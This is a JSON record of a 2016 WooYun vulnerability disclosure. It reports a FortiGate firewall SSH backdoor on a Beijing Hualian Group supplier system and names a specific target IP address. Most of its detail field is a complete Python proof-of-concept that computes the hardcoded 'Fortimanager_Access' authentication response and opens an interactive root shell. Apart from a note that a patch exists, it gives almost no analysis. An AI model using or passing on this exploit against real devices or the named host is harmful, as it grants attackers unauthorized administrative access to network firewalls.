{"id": 74345, "wybug_id": "wooyun-2016-0169662", "wybug_title": "华联某供销商系统存在防火墙后门（FROTIGATE）", "wybug_corp": "北京华联集团", "wybug_author": "路人甲", "wybug_date": "2016-01-13 18:03", "wybug_open_date": "2016-02-27 11:49", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["未授权访问"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-13：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2016-02-27：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 废话不多说~ 详细说明：  问题URL61.138.105.218利用POC\ndef custom_handler(title, instructions, prompt_list):    n = prompt_list[0][0]    m = hashlib.sha1()    m.update('\\x00' * 12)    m.update(n + 'FGTAbc11*xy+Qqz27')    m.update('\\xA3\\x88\\xBA\\x2E\\x42\\x4C\\xB0\\x4A\\x53\\x79\\x30\\xC1\\x31\\x07\\xCC\\x3F\\xA1\\x32\\x90\\x29\\xA9\\x81\\x5B\\x70')    h = 'AK1' + base64.b64encode('\\x00' * 12 + m.digest())    return [h]def main():    if len(sys.argv) < 2:        print 'Usage: ' + sys.argv[0] + ' <target-ip>'        exit(-1)    client = paramiko.SSHClient()    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())    try:        client.connect(sys.argv[1], username='', allow_agent=False, look_for_keys=False)    except paramiko.ssh_exception.SSHException:        pass    trans = client.get_transport()    try:        trans.auth_password(username='Fortimanager_Access', password='', event=None, fallback=True)    except paramiko.ssh_exception.AuthenticationException:        pass    trans.auth_interactive(username='Fortimanager_Access', handler=custom_handler)    chan = client.invoke_shell()    oldtty = termios.tcgetattr(sys.stdin)    try:        tty.setraw(sys.stdin.fileno())        tty.setcbreak(sys.stdin.fileno())        chan.settimeout(0.0)        while True:            r, w, e = select.select([chan, sys.stdin], [], [])            if chan in r:                try:                    x = u(chan.recv(1024))                    if len(x) == 0:                        sys.stdout.write('\\r\\n*** EOF\\r\\n')                        break                    sys.stdout.write(x)                    sys.stdout.flush()                except socket.timeout:                    pass            if sys.stdin in r:                x = sys.stdin.read(1)                if len(x) == 0:                    break                chan.send(x)    finally:        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, oldtty)if __name__ == '__main__':    main()\n   漏洞证明：  \n\n\n\n\n\n   修复方案：  补丁已有~   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}